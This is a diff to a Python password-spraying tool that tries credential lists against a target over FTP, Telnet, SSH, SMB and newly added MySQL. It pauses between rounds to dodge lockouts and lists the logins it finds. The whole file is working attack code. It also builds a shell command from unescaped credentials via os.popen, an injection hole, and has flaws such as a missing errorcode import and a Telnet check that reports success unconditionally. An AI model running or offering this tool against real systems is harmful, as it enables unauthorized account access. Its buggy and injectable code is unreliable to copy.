@@ -1,19 +1,22 @@
 #!/usr/bin/python3
+#FOR READMER
+#pip3 install mysql-connector
 import argparse
 import time
 import telnetlib
 import paramiko
 import os
-from ftplib import FTP
+import mysql.connector
+import ftplib
 
 #lists
 user_list = list()
 pass_list = list()
 valid_creds = list()
 #Pretty messages
-def pGreen(value): return '\033[92m{}\033[90m'.format(value)
-def pRed(value): return '\033[91m{}\033[90m'.format(value)
-def pWarning(value): return '\033[93m{}\033[90m'.format(value)
+def pGreen(value): return '\033[92m{}\033[00m'.format(value)
+def pRed(value): return '\033[91m{}\033[00m'.format(value)
+def pWarning(value): return '\033[93m{}\033[00m'.format(value)
 #Arguments
 parser = argparse.ArgumentParser()
 parser.add_argument('protocol', type=str,help='Protocol to perform the spray (telnet,ssh,ftp,smb)')
@@ -41,18 +44,19 @@ def ftp_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
 	ftp_p = spec_port if spec_port else 21
 	try:
-		ftp = FTP()
+		ftp = ftplib.FTP()
 		ftp.connect(ip,ftp_p)
 		ftp.login(user,password)
 		ftp.quit()
-		msg += pGreen('-- Success!!!')
+		msg += pGreen(' -> Success!!!')
 		valid_creds.append(user+':'+password)
-	except Exception as e:
-		print(str(e))
-		msg += pRed('-- Failed!!!')
+		print(msg)
+		return True
+	except ftplib.error_perm:
+		msg += pRed(' -> Failed!!!')
 		pass
 	print(msg)
-	return
+	return False
 
 def telnet_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
@@ -66,13 +70,15 @@ def telnet_connect(user,password):
 		tn.read_until('Password: '.encode('utf-8'))
 		tn.write(p)
 		valid_creds.append(user+':'+password)
-		msg += pGreen('-- Success!!!')
+		msg += pGreen(' -> Success!!!')
+		print(msg)
+		return True
 	except Exception as e:
 		print(str(e))
-		msg += pRed('-- Failed!!!')
+		msg += pRed(' -> Failed!!!')
 		pass
 	print(msg)
-	return
+	return False
 
 def ssh_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
@@ -83,45 +89,80 @@ def ssh_connect(user,password):
 		ssh.connect(ip, ssh_p, user, password)
 		ssh.close()
 		valid_creds.append(user+':'+password)
-		msg += pGreen('-- Success!!!')
-	except Exception as e:
-		print(str(e))
-		msg += pRed('-- Failed!!!')
+		msg += pGreen(' -> Success!!!')
+		print(msg)
+		return True
+	except paramiko.AuthenticationException:
+		msg += pRed(' -> Failed!!!')
+		pass
+	except paramiko.ssh_exception.SSHException as e:
+		if 'Error reading SSH protocol banner' in str(e):
+			print(pWarning('Carefull to many requests performed on the server try adding more time!!'))
+		msg += pRed(' -> Failed!!!')
 		pass
 	print(msg)
-	return
+	return False
 
 def smb_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
 	result = os.popen( 'rpcclient -U "{}.{}" -c "getusername;quit" {}'.format(user,password,ip)).read()
 	if not 'NT_STATUS_LOGON_FAILURE' in result:
 		valid_creds.append(user+':'+password)
-		msg += pGreen('-- Success!!!')
+		msg += pGreen(' -> Success!!!')
+		print(msg)
+		return True
 	else:
-		msg += pRed('-- Failed!!!')
+		msg += pRed(' -> Failed!!!')
+		print(msg)
+		return False
+
+def mysql_connect(user,password):
+	msg = '[*] Trying with {}:{}'.format(user,password)
+	mysql_p = spec_port if spec_port else 3306
+	try:
+		mydb = mysql.connector.connect(host=ip,user=user,password=password,port=mysql_p)
+		cursor = mydb.cursor()
+		cursor.execute("SELECT @@VERSION")
+		mydb.close()
+		valid_creds.append(user+':'+password)
+		msg += pGreen(' -> Success!!!')
+		print(msg)
+		return True
+	except mysql.connector.Error as err:
+		if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
+  			msg += pRed(' -> Failed!!!')
+	except Exception as e:
+		print(str(e))
+		msg += pRed(' -> Failed!!!')
+		pass
 	print(msg)
-	return
+	return False
 
 def spray():
 	c_attemps = 0
 	for p in pass_list:
-		for u in user_list:
-			if 'ftp' == prot:
-				ftp_connect(u,p)
-			elif 'ssh' == prot:
-				ssh_connect(u,p)
-			elif 'telnet' == prot:
-				telnet_connect(u,p)
-			else:
-				smb_connect(u,p)
 		if c_attemps == max_attemps:
 			print(pWarning('Going to sleep for {} minutes'.format(timer)))
 			time.sleep(timer*60)
 			c_attemps = 0
 			print(pWarning('Back on spray'))
-		else:
-			c_attemps+= 1
+		for u in user_list:
+			if 'ftp' == prot:
+				success = ftp_connect(u,p)
+			elif 'ssh' == prot:
+				success = ssh_connect(u,p)
+			elif 'telnet' == prot:
+				success = telnet_connect(u,p)
+			elif 'mysql' == prot:
+				success = mysql_connect(u,p)
+			else:
+				success = smb_connect(u,p)
+			if success:
+				user_list.remove(u)
+		c_attemps+= 1
+
 	if len(valid_creds)>0:
+		print(pGreen('Obtained the following credentials:'))
 		print(''.join(creds+'\n' for creds in valid_creds))
 	return
 
